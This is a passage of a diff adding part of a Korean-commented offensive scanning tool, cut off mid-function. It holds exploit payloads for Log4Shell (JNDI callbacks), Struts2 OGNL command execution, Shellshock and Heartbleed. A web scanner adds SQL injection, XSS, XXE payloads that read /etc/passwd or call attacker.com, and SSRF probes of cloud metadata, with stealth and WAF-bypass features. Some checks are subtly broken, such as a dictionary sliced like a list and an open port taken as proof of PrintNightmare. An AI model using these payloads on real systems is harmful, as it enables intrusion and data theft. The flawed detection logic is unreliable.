@@ -1,0 +1,1339 @@
+================================================================================
+프로젝트 코드 수집 - Part 10
+수집 시간: 2026-01-01 09:21:35
+파일 범위: 41 ~ 43
+================================================================================
+
+📁 이 파트에 포함된 파일:
+ 41. app\core\exploit\verifier.py (16,662 chars)
+ 42. app\core\exploit\web_vulnerabilities.py (31,649 chars)
+ 43. app\core\exploit\__init__.py (587 chars)
+
+================================================================================
+
+
+================================================================================
+파일 경로: app\core\exploit\verifier.py
+파일 크기: 16,662 characters
+확장자: .py (python)
+================================================================================
+
+```python
+# app/core/exploit/verifier.py
+# 취약점 검증 모듈 - 실제 익스플로잇으로 CVE 검증
+
+import requests
+import time
+import re
+import logging
+from typing import Dict, Any, Optional, List
+
+logger = logging.getLogger(__name__)
+
+
+class ExploitVerifier:
+    """
+    CVE를 실제 익스플로잇으로 검증하는 클래스
+    """
+    
+    def __init__(self, callback_server: Optional[str] = None):
+        """
+        Args:
+            callback_server: DNS 콜백을 받을 서버 주소 (예: "attacker.com")
+        """
+        self.callback_server = callback_server
+        self.verified_cves = {}
+    
+    def verify_cve(self, target: str, cve_id: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        CVE 실제 취약한지 검증
+        
+        Args:
+            target: 타겟 URL 또는 IP:포트
+            cve_id: CVE ID
+            service_info: 서비스 정보 (제품명, 버전 등)
+        
+        Returns:
+            {
+                "verified": True/False,
+                "exploitable": True/False,
+                "severity": "CRITICAL/HIGH/MEDIUM/LOW",
+                "method": "exploit_method",
+                "details": {...}
+            }
+        """
+        verifiers = {
+            "CVE-2021-44228": self.verify_log4shell,
+            "CVE-2021-45046": self.verify_log4shell,  # Log4Shell 변형
+            "CVE-2017-5638": self.verify_struts2,
+            "CVE-2014-0160": self.verify_heartbleed,
+            "CVE-2014-6271": self.verify_shellshock,
+            "CVE-2017-0144": self.verify_eternalblue,
+            "CVE-2021-34527": self.verify_printnightmare,
+        }
+        
+        if cve_id in verifiers:
+            try:
+                result = verifiers[cve_id](target, service_info)
+                self.verified_cves[cve_id] = result
+                return result
+            except Exception as e:
+                logger.error(f"CVE 검증 실패 ({cve_id}): {e}")
+                return {
+                    "verified": False,
+                    "exploitable": False,
+                    "severity": "UNKNOWN",
+                    "error": str(e)
+                }
+        
+        return {
+            "verified": False,
+            "exploitable": False,
+            "severity": "UNKNOWN",
+            "reason": "No verifier available for this CVE"
+        }
+    
+    def verify_log4shell(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Log4Shell (CVE-2021-44228) 실제 검증
+        
+        Interactsh 같은 DNS 콜백 서비스를 사용한 실제 검증
+        """
+        vulnerable = False
+        callback_domain = None
+        proof = None
+        
+        try:
+            # Interactsh API를 사용한 DNS 콜백 서비스
+            # 실제 환경에서는 interactsh.com 또는 자체 서버 사용
+            try:
+                session = requests.Session()
+                
+                # Interactsh에서 임시 도메인 생성 시도
+                try:
+                    interactsh_url = "https://interactsh.com/api/register"
+                    response = session.post(interactsh_url, timeout=10)
+                    if response.status_code == 200:
+                        callback_domain = response.json().get('domain')
+                        logger.info(f"Interactsh 도메인 생성: {callback_domain}")
+                except:
+                    # Interactsh가 실패하면 사용자 제공 콜백 서버 사용
+                    if self.callback_server:
+                        callback_domain = self.callback_server
+                    else:
+                        # 랜덤 서브도메인 생성 (실제로는 작동 안함)
+                        import random
+                        import string
+                        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+                        callback_domain = f"{random_str}.interact.sh"
+                        logger.warning("Interactsh 사용 불가, 랜덤 도메인 사용 (검증 불가능)")
+                
+                if callback_domain:
+                    # JNDI lookup 페이로드
+                    callback_url = f"ldap://{callback_domain}/a"
+                    payload = f"${{jndi:{callback_url}}}"
+                    
+                    # 여러 헤더에 페이로드 삽입
+                    test_headers = [
+                        {"User-Agent": payload},
+                        {"X-Api-Version": payload},
+                        {"X-Forwarded-For": payload},
+                        {"Referer": payload},
+                        {"Origin": payload},
+                        {"X-Requested-With": payload},
+                        {"X-Forwarded-Host": payload},
+                        {"X-Original-URL": payload},
+                    ]
+                    
+                    parsed = self._parse_target(target)
+                    base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
+                    
+                    # 페이로드 전송
+                    for headers in test_headers:
+                        try:
+                            # GET 요청
+                            requests.get(
+                                base_url,
+                                headers=headers,
+                                timeout=5,
+                                verify=False,
+                                allow_redirects=True
+                            )
+                            
+                            # POST 요청도 시도
+                            requests.post(
+                                base_url,
+                                headers=headers,
+                                data={"test": payload, "username": payload, "password": payload},
+                                timeout=5,
+                                verify=False,
+                                allow_redirects=True
+                            )
+                        except:
+                            continue
+                    
+                    # DNS 콜백 확인 (5초 대기)
+                    time.sleep(5)
+                    
+                    # Interactsh API로 DNS 로그 확인
+                    try:
+                        poll_url = f"https://interactsh.com/api/poll?domain={callback_domain}"
+                        result = session.get(poll_url, timeout=10)
+                        if result.status_code == 200:
+                            data = result.json()
+                            if data.get('data') and len(data['data']) > 0:
+                                vulnerable = True
+                                proof = data['data']
+                                logger.info(f"Log4Shell 취약점 확인! DNS 콜백 수신: {len(data['data'])}개")
+                    except Exception as e:
+                        logger.debug(f"Interactsh 폴링 실패: {e}")
+                
+            except Exception as e:
+                logger.warning(f"Interactsh 사용 실패, 버전 기반 판단으로 전환: {e}")
+                # Fallback: 서비스 정보로 판단
+                if "log4j" in str(service_info).lower() or "log4shell" in str(service_info).lower():
+                    vulnerable = True
+                    proof = "Version-based detection (no DNS callback available)"
+            
+        except Exception as e:
+            logger.error(f"Log4Shell 검증 실패: {e}")
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "JNDI Lookup Injection",
+            "details": {
+                "callback_domain": callback_domain,
+                "proof": proof,
+                "tested": True
+            }
+        }
+    
+    def verify_heartbleed(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Heartbleed (CVE-2014-0160) 실제 검증
+        
+        OpenSSL Heartbeat 확장 취약점 테스트
+        """
+        try:
+            import socket
+            import ssl
+            import struct
+            
+            parsed = self._parse_target(target)
+            host = parsed['host']
+            port = parsed['port']
+            
+            # SSL 연결
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((host, port))
+            ssock = context.wrap_socket(sock, server_hostname=host)
+            
+            # Heartbleed 페이로드 전송
+            # Heartbeat Request (Type: 1, Length: 0x4000, Payload: "A" * 0x4000)
+            payload = b'\x18\x03\x02\x00\x03\x01\x40\x00' + b'A' * 0x4000
+            
+            ssock.send(payload)
+            response = ssock.recv(0x4000)
+            ssock.close()
+            
+            # 응답에 메모리 내용이 포함되어 있으면 취약
+            if len(response) > 0x4000 or b'\x00\x00' in response:
+                vulnerable = True
+            else:
+                vulnerable = False
+                
+        except Exception as e:
+            logger.debug(f"Heartbleed 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "Heartbeat Extension",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable
+            }
+        }
+    
+    def verify_struts2(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Apache Struts2 RCE (CVE-2017-5638) 검증
+        
+        OGNL 표현식 주입 테스트
+        """
+        try:
+            parsed = self._parse_target(target)
+            base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
+            
+            # Struts2 OGNL 페이로드
+            payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo VULNERABLE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+            
+            # Content-Type 헤더에 페이로드 삽입
+            headers = {
+                "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary{payload}"
+            }
+            
+            response = requests.post(
+                base_url,
+                headers=headers,
+                data={"test": "data"},
+                timeout=5,
+                verify=False
+            )
+            
+            # 응답에 "VULNERABLE" 문자열이 있으면 취약
+            vulnerable = "VULNERABLE" in response.text
+            
+        except Exception as e:
+            logger.debug(f"Struts2 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "OGNL Expression Injection",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable
+            }
+        }
+    
+    def verify_shellshock(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Shellshock (CVE-2014-6271) 검증
+        
+        Bash 환경 변수 주입 테스트
+        """
+        try:
+            parsed = self._parse_target(target)
+            base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
+            
+            # Shellshock 페이로드
+            payload = "() { :; }; echo VULNERABLE"
+            
+            headers = {
+                "User-Agent": payload,
+                "Cookie": f"test={payload}",
+                "Referer": payload
+            }
+            
+            response = requests.get(
+                base_url,
+                headers=headers,
+                timeout=5,
+                verify=False
+            )
+            
+            vulnerable = "VULNERABLE" in response.text or "VULNERABLE" in str(response.headers)
+            
+        except Exception as e:
+            logger.debug(f"Shellshock 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "Bash Environment Variable Injection",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable
+            }
+        }
+    
+    def verify_eternalblue(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        EternalBlue (CVE-2017-0144) 검증
+        
+        SMB 프로토콜 취약점 테스트 (간단한 버전)
+        """
+        # EternalBlue는 복잡한 SMB 프로토콜 익스플로잇이 필요
+        # 여기서는 버전 기반으로만 판단
+        try:
+            parsed = self._parse_target(target)
+            host = parsed['host']
+            port = parsed.get('port', 445)
+            
+            # SMB 버전 확인 (간단한 배너 그랩핑)
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((host, port))
+            banner = sock.recv(1024).decode('utf-8', errors='ignore')
+            sock.close()
+            
+            # Windows 버전 확인
+            if "Windows" in banner:
+                # Windows 7/Server 2008 R2 이하 버전은 취약
+                version_match = re.search(r'Windows\s+(\d+)', banner)
+                if version_match:
+                    version = int(version_match.group(1))
+                    vulnerable = version <= 6  # Windows 7/Server 2008 R2
+                else:
+                    vulnerable = False
+            else:
+                vulnerable = False
+                
+        except Exception as e:
+            logger.debug(f"EternalBlue 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "SMB Protocol Exploit",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable,
+                "banner": banner[:100] if 'banner' in locals() else None
+            }
+        }
+    
+    def verify_printnightmare(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        PrintNightmare (CVE-2021-34527) 검증
+        
+        Windows Print Spooler 취약점 테스트
+        """
+        try:
+            parsed = self._parse_target(target)
+            host = parsed['host']
+            port = parsed.get('port', 445)
+            
+            # RPC over SMB로 Print Spooler 확인
+            # 실제로는 더 복잡한 RPC 호출이 필요
+            # 여기서는 포트 445가 열려있고 Windows면 가능성 있음으로 판단
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            
+            # 포트가 열려있으면 가능성 있음 (실제 검증은 더 복잡)
+            vulnerable = (result == 0)
+            
+        except Exception as e:
+            logger.debug(f"PrintNightmare 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "RPC Print Spooler",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable,
+                "note": "Full verification requires RPC protocol analysis"
+            }
+        }
+    
+    def _parse_target(self, target: str) -> Dict[str, str]:
+        """
+        타겟 URL/IP:포트를 파싱
+        """
+        from urllib.parse import urlparse
+        
+        # URL 형식인지 확인
+        if "://" in target:
+            parsed = urlparse(target)
+            return {
+                "scheme": parsed.scheme or "http",
+                "host": parsed.hostname or target.split("://")[1].split(":")[0],
+                "port": parsed.port or (443 if parsed.scheme == "https" else 80)
+            }
+        else:
+            # IP:포트 형식
+            if ":" in target:
+                host, port = target.rsplit(":", 1)
+                return {
+                    "scheme": "http",
+                    "host": host,
+                    "port": int(port)
+                }
+            else:
+                return {
+                    "scheme": "http",
+                    "host": target,
+                    "port": 80
+                }
+```
+
+--------------------------------------------------------------------------------
+
+
+================================================================================
+파일 경로: app\core\exploit\web_vulnerabilities.py
+파일 크기: 31,649 characters
+확장자: .py (python)
+================================================================================
+
+```python
+# app/core/exploit/web_vulnerabilities.py
+# 웹 취약점 실제 테스트 모듈
+
+import requests
+import time
+import re
+import random
+import logging
+from typing import Dict, Any, List, Optional
+from urllib.parse import urljoin, urlparse, quote
+
+from ..utils.encoding import PayloadEncoder, WAFBypass
+from ..utils.stealth import StealthMode, ConnectionPool, TimeoutManager
+from ..utils.rate_limit import RateLimitDetector
+from .advanced_verification import AdvancedVerification
+
+logger = logging.getLogger(__name__)
+
+
+class WebVulnerabilityScanner:
+    """
+    웹 애플리케이션 취약점 실제 테스트
+    """
+    
+    def __init__(self, timeout: int = 10, stealth_mode: bool = True, use_pool: bool = True):
+        self.timeout = timeout
+        self.stealth_mode = stealth_mode
+        self.use_pool = use_pool
+        
+        # User-Agent 설정 (스텔스 모드 여부와 관계없이)
+        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        
+        # 스텔스 모드 설정
+        if stealth_mode:
+            self.stealth = StealthMode(delay_min=0.5, delay_max=2.0)
+            self.user_agent = self.stealth.get_random_user_agent()
+        else:
+            self.stealth = None
+        
+        # 연결 풀 설정
+        if use_pool:
+            self.pool = ConnectionPool()
+            self.session = self.pool.get_session()
+        else:
+            self.pool = None
+            self.session = requests
+        
+        # 고급 검증
+        self.advanced_verification = AdvancedVerification(min_samples=3, confidence_threshold=0.8)
+        
+        # 타임아웃 관리
+        self.timeout_mgr = TimeoutManager(connect_timeout=5.0, read_timeout=10.0)
+        
+        # Rate Limiting 감지
+        self.rate_limit_detector = RateLimitDetector(max_requests_per_minute=60)
+    
+    def scan_all(self, url: str) -> Dict[str, Any]:
+        """
+        모든 웹 취약점 테스트
+        
+        Returns:
+            {
+                "sql_injection": {...},
+                "xss": {...},
+                "xxe": {...},
+                "ssrf": {...},
+                "lfi": {...},
+                "command_injection": {...}
+            }
+        """
+        from .latest_vectors import LatestAttackVectors
+        
+        latest_vectors = LatestAttackVectors(timeout=self.timeout)
+        
+        results = {
+            "sql_injection": self.test_sql_injection(url),
+            "xss": self.test_xss(url),
+            "xxe": self.test_xxe(url),
+            "ssrf": self.test_ssrf(url),
+            "lfi": self.test_lfi(url),
+            "command_injection": self.test_command_injection(url),
+            "path_traversal": self.test_path_traversal(url),
+            # 최신 공격 벡터
+            "ssti": latest_vectors.test_ssti(url),
+            "graphql": latest_vectors.test_graphql(url),
+            "jwt": latest_vectors.test_jwt(url),
+            "prototype_pollution": latest_vectors.test_prototype_pollution(url),
+            "http_request_smuggling": latest_vectors.test_http_request_smuggling(url),
+            # 인증 및 세션 관리
+            "broken_authentication": self._test_auth_session(url),
+            # 데이터베이스 공격 심화
+            "nosql_injection": self._test_nosql_injection(url),
+            "orm_injection": self._test_orm_injection(url)
+        }
+        
+        return results
+    
+    def test_sql_injection(self, url: str) -> Dict[str, Any]:
+        """
+        SQL Injection 테스트 (Error-based, Time-based, Boolean-based)
+        데이터베이스별 정교한 페이로드 사용
+        """
+        vulnerabilities = []
+        
+        # Error-based SQL Injection 페이로드 (데이터베이스별)
+        error_payloads = {
+            "mysql": [
+                "'",
+                "\"",
+                "' OR '1'='1",
+                "1' AND 1=1--",
+                "1' AND 1=2--",
+                "1' UNION SELECT NULL--",
+                "' OR 1=1--",
+                "admin'--",
+                "admin'/*",
+                "' OR 'x'='x",
+                "' OR 1=1#",
+                "') OR ('1'='1--",
+                "1' AND extractvalue(1,concat(0x7e,version()))--",
+                "1' AND updatexml(1,concat(0x7e,database()),1)--",
+                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+            ],
+            "postgresql": [
+                "'",
+                "1' AND 1=CAST(version() AS INT)--",
+                "1' AND 1=CAST(current_database() AS INT)--",
+                "1' AND 1=CAST((SELECT version()) AS INT)--",
+                "1' UNION SELECT NULL,NULL--",
+                "1' OR '1'='1'--"
+            ],
+            "mssql": [
+                "'",
+                "1' AND 1=CONVERT(INT,@@VERSION)--",
+                "1' AND 1=CONVERT(INT,DB_NAME())--",
+                "1'; EXEC xp_cmdshell('dir')--",
+                "1' UNION SELECT NULL,NULL--"
+            ],
+            "oracle": [
+                "'",
+                "1' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--",
+                "1' UNION SELECT NULL FROM DUAL--",
+                "1' OR '1'='1'--"
+            ],
+            "generic": [
+                "'",
+                "\"",
+                "' OR '1'='1",
+                "1' AND 1=1--",
+                "1' AND 1=2--",
+                "1' UNION SELECT NULL--"
+            ]
+        }
+        
+        # Time-based SQL Injection 페이로드 (데이터베이스별)
+        time_payloads = {
+            "mysql": [
+                "1' AND SLEEP(5)--",
+                "1' AND BENCHMARK(5000000,MD5('A'))--",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "1'; SELECT SLEEP(5)--"
+            ],
+            "postgresql": [
+                "1' AND pg_sleep(5)--",
+                "1'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+                "1'; SELECT pg_sleep(5)--"
+            ],
+            "mssql": [
+                "1'; WAITFOR DELAY '00:00:05'--",
+                "1'; IF (1=1) WAITFOR DELAY '00:00:05'--",
+                "1'; EXEC xp_cmdshell('ping 127.0.0.1')--"
+            ],
+            "oracle": [
+                "1' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--",
+                "1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--"
+            ],
+            "generic": [
+                "1' AND SLEEP(5)--",
+                "1'; WAITFOR DELAY '00:00:05'--",
+                "1' AND pg_sleep(5)--"
+            ]
+        }
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            # GET 파라미터 테스트
+            params = self._extract_params(url)
+            
+            for param_name in params[:5]:  # 최대 5개 파라미터만 테스트
+                # Error-based 테스트
+                for payload in error_payloads[:5]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(payload)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent}
+                        )
+                        
+                        # Rate Limiting 확인
+                        if self.rate_limit_detector.check_rate_limit(response):
+                            if self.rate_limit_detector.should_wait():
+                                wait_time = self.rate_limit_detector.get_wait_time()
+                                logger.warning(f"Rate limited. Waiting {wait_time:.1f}s...")
+                                time.sleep(wait_time)
+                            continue
+                        
+                        self.rate_limit_detector.record_request()
+                        
+                        # SQL 에러 패턴 확인 (데이터베이스별)
+                        error_patterns = {
+                            "mysql": [
+                                r"mysql.*error",
+                                r"warning.*mysql",
+                                r"you have an error in your sql syntax",
+                                r"mysql_fetch",
+                                r"mysql_num_rows",
+                                r"mysql_query"
+                            ],
+                            "postgresql": [
+                                r"postgresql.*error",
+                                r"pg_query\(\)",
+                                r"pg_exec\(\)",
+                                r"postgres.*syntax error"
+                            ],
+                            "mssql": [
+                                r"microsoft.*odbc",
+                                r"sql server.*error",
+                                r"odbc sql server driver",
+                                r"sqlserver jdbc"
+                            ],
+                            "oracle": [
+                                r"ora-\d+",
+                                r"oracle.*error",
+                                r"oracle.*exception",
+                                r"oracle jdbc"
+                            ],
+                            "generic": [
+                                r"sql.*syntax",
+                                r"sql.*error",
+                                r"unclosed quotation mark",
+                                r"driver.*sql",
+                                r"sql.*exception"
+                            ]
+                        }
+                        
+                        response_lower = response.text.lower()
+                        detected_db = None
+                        evidence = None
+                        
+                        for db_type, patterns in error_patterns.items():
+                            for pattern in patterns:
+                                match = re.search(pattern, response_lower, re.IGNORECASE)
+                                if match:
+                                    detected_db = db_type
+                                    evidence = match.group(0)
+                                    break
+                            if detected_db:
+                                break
+                        
+                        if detected_db:
+                            vulnerabilities.append({
+                                "type": f"Error-based SQL Injection ({detected_db})",
+                                "parameter": param_name,
+                                "payload": payload,
+                                "severity": "HIGH",
+                                "method": "GET",
+                                "detection_method": "error_based",
+                                "evidence": evidence,
+                                "confidence": 85 if detected_db != "generic" else 70
+                            })
+                            break
+                    except:
+                        continue
+                
+                # Time-based 테스트 (데이터베이스별)
+                for db_type, payloads in time_payloads.items():
+                    for payload in payloads[:3]:
+                        try:
+                            start = time.time()
+                            test_url = f"{base_url}?{param_name}={quote(payload)}"
+                            response = requests.get(
+                                test_url,
+                                timeout=10,
+                                verify=False,
+                                headers={"User-Agent": self.user_agent}
+                            )
+                            elapsed = time.time() - start
+                            
+                            # 정확한 시간 지연 확인 (5초 ± 0.5초)
+                            if elapsed >= 4.5:
+                                vulnerabilities.append({
+                                    "type": f"Time-based SQL Injection ({db_type})",
+                                    "parameter": param_name,
+                                    "payload": payload,
+                                    "measured_delay": elapsed,
+                                    "expected_delay": 5.0,
+                                    "severity": "HIGH",
+                                    "method": "GET",
+                                    "detection_method": "time_based",
+                                    "confidence": 90 if abs(elapsed - 5.0) < 0.5 else 75
+                                })
+                                break
+                        except:
+                            continue
+                
+                # Boolean-based Blind SQL Injection 테스트 - 다단계 검증
+                try:
+                    true_payload = f"1' AND '1'='1"
+                    false_payload = f"1' AND '1'='2"
+                    
+                    verification_result = self.advanced_verification.verify_boolean_based_sqli(
+                        base_url,
+                        f"{param_name}={quote(true_payload)}",
+                        f"{param_name}={quote(false_payload)}",
+                        samples=3
+                    )
+                    
+                    if verification_result.get("verified"):
+                        vulnerabilities.append({
+                            "type": "Boolean-based Blind SQL Injection",
+                            "parameter": param_name,
+                            "severity": "HIGH",
+                            "method": "GET",
+                            "detection_method": "boolean_based",
+                            "confidence": int(verification_result.get("confidence", 0.8) * 100),
+                            "verification": verification_result
+                        })
+                except Exception as e:
+                    logger.debug(f"Boolean-based SQLi 테스트 실패: {e}")
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"SQL Injection 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_xss(self, url: str) -> Dict[str, Any]:
+        """
+        XSS (Cross-Site Scripting) 테스트
+        """
+        vulnerabilities = []
+        
+        # XSS 페이로드
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<body onload=alert('XSS')>",
+            "'\"><script>alert('XSS')</script>",
+            "<iframe src=javascript:alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:5]:
+                for payload in xss_payloads[:5]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(payload)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent}
+                        )
+                        
+                        # 페이로드가 응답에 그대로 포함되어 있으면 취약
+                        if payload in response.text or payload.replace("'", "&#39;") in response.text:
+                            vulnerabilities.append({
+                                "type": "Reflected XSS",
+                                "parameter": param_name,
+                                "payload": payload,
+                                "severity": "MEDIUM",
+                                "method": "GET"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"XSS 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_xxe(self, url: str) -> Dict[str, Any]:
+        """
+        XXE (XML External Entity) 테스트
+        """
+        vulnerabilities = []
+        
+        # XXE 페이로드
+        xxe_payloads = [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            for payload in xxe_payloads[:2]:
+                try:
+                    headers = {
+                        "Content-Type": "application/xml",
+                        "User-Agent": self.user_agent
+                    }
+                    
+                    response = requests.post(
+                        base_url,
+                        data=payload,
+                        headers=headers,
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    
+                    # 파일 내용이나 외부 엔티티 참조가 응답에 포함되면 취약
+                    if "root:" in response.text or "attacker.com" in response.text or "[fonts]" in response.text:
+                        vulnerabilities.append({
+                            "type": "XXE",
+                            "payload": payload[:100],
+                            "severity": "HIGH",
+                            "method": "POST"
+                        })
+                        break
+                except:
+                    continue
+            
+        except Exception as e:
+            logger.warning(f"XXE 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_ssrf(self, url: str) -> Dict[str, Any]:
+        """
+        SSRF (Server-Side Request Forgery) 테스트
+        """
+        vulnerabilities = []
+        
+        # SSRF 테스트 URL (메타데이터 서비스 등)
+        ssrf_targets = [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://127.0.0.1:22",
+            "http://localhost/admin",
+            "file:///etc/passwd"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:3]:
+                for target in ssrf_targets[:2]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(target)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=5,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent},
+                            allow_redirects=False
+                        )
+                        
+                        # 메타데이터나 로컬 파일 내용이 응답에 포함되면 취약
+                        if "169.254.169.254" in target and ("instance-id" in response.text or "ami-id" in response.text):
+                            vulnerabilities.append({
+                                "type": "SSRF",
+                                "parameter": param_name,
+                                "target": target,
+                                "severity": "HIGH",
+                                "method": "GET"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"SSRF 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
